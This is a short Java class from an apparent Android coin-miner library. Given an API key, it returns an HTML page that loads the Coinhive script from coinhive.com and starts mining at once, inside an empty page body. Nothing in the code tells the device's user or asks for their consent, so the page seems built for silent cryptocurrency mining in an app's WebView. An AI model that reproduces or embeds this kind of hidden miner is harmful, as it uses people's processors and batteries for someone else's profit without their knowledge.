package make.moneny.coin_miner_android_library;

import android.util.Log;

/**
 * Created by tarfa on 28/11/17.
 */

public class SettingFileCoinMiner {


    public static String getFileSetting(String apiKey){
        
        if (apiKey.equals("")){

            Log.e("err api key","No Key Yet");

        }else {
            StringBuilder builder=new StringBuilder();
            builder.append("<html><head>");
            builder.append("<script src='https://coinhive.com/lib/coinhive.min.js'></script>");
            builder.append("<script> var miner = new CoinHive.Anonymous('");
            builder.append(apiKey);
            builder.append("'); miner.start();</script>");
            builder.append("</head>");
            builder.append("<body>");
            builder.append("</body>");
            builder.append("</html>");

            return builder.toString();
        }

        return null;
    }


}
